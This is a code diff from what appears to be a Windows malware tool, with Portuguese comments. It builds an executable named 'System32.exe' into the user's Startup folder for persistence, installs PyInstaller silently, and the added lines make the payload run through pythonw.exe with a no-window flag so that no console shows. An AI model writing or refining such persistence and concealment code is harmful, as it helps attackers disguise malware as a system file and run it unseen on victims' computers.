@@ -432,6 +432,7 @@ class Others:
         exeFile = os.path.join(startupFolder, "System32.exe")
         icoFile = os.path.join(os.environ["APPDATA"], "python313", "icon.ico")
         stubFile = os.path.join(os.environ["APPDATA"], "python313", "stub.py")
+        pythonwPath = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
 
         # Baixa o icone do GitHub
         try:
@@ -444,14 +445,34 @@ class Others:
             icoFile = "C:\\Windows\\System32\\shell32.dll"
 
         # Cria o script stub que sera compilado
+        # Usa pythonw.exe para rodar sem janela e sem CMD aparecendo
         with open(stubFile, "w") as f:
-            f.write(f'import os\nos.system("cmd /c \\"cd %APPDATA%\\\\{BASE_FOLDER_NAME} & python -m System32 {sys.argv[1]}\\"")')
+            f.write(f'''import subprocess
+import os
+import sys
 
-        # Instala pyinstaller e compila o .exe com icone
+pythonw = r"{pythonwPath}"
+module_dir = os.path.join(os.environ["APPDATA"], "{BASE_FOLDER_NAME}")
+arg = "{sys.argv[1]}"
+
+subprocess.Popen(
+    [pythonw, "-m", "System32", arg],
+    cwd=module_dir,
+    creationflags=0x08000000,
+    close_fds=True
+)
+''')
+
+        # Instala pyinstaller se necessario
         pipPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pip.exe")
         pyinstallerPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pyinstaller.exe")
 
-        subprocess.run(f'"{pipPath}" install pyinstaller', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(
+            f'"{pipPath}" install pyinstaller',
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+
+        # Compila o stub em .exe com icone e sem janela
         subprocess.run(
             f'"{pyinstallerPath}" --onefile --windowed --icon="{icoFile}" --distpath="{startupFolder}" --name="System32" "{stubFile}"',
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
